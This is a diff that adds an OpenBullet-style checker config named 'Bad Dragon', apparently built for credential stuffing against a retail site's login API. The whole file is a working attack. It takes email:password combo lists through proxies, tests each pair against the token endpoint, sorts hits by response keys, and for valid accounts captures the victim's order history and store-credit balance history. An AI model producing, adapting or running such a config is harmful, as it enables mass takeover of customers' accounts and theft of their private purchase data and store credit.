@@ -1,0 +1,57 @@
+[SETTINGS]
+{
+  "Name": "Bad Dragon",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-24T13:14:53.68353-04:00",
+  "AdditionalInfo": "",
+  "Author": "Howzi",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://bad-dragon.com/api/token" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+
+#key_check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email and/or password" 
+
+#parse_token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+#get_order_history REQUEST GET "https://bad-dragon.com/api/orders" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Authorization: <token>" 
+
+#parse_order_history PARSE "<SOURCE>" LR "" "" -> CAP "Order History" 
+
+#get_store_credit REQUEST GET "https://bad-dragon.com/api/store-credit-history" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)" 
+  HEADER "Authorization: <token>" 
+  HEADER "referer: https://bad-dragon.com/account/credit" 
+
+#parse_store_credit PARSE "<SOURCE>" LR "" "" -> CAP "Store Credit" 
+
